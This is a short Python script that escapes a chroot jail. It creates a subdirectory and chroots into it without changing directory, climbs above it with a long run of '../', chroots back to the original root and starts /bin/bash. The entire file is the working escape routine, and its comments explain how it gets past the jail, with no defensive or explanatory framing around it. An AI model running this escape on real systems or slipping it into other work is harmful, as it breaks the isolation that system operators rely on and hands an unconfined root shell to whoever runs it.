#!/usr/bin/env python

import os

os.makedirs('.foo')
os.chroot('.foo')  # chroot into another directory, but we don't chdir
# pwd still has a reference to a directory outside the (new) chroot, so
os.chdir('../../../../../../../../')  # chdir to a directory above pwd. kernel automatically converts extra ../ to /
os.chroot('.')  # finally chroot to the old (topmost) root
os.execv('/bin/bash', ['/bin/bash'])
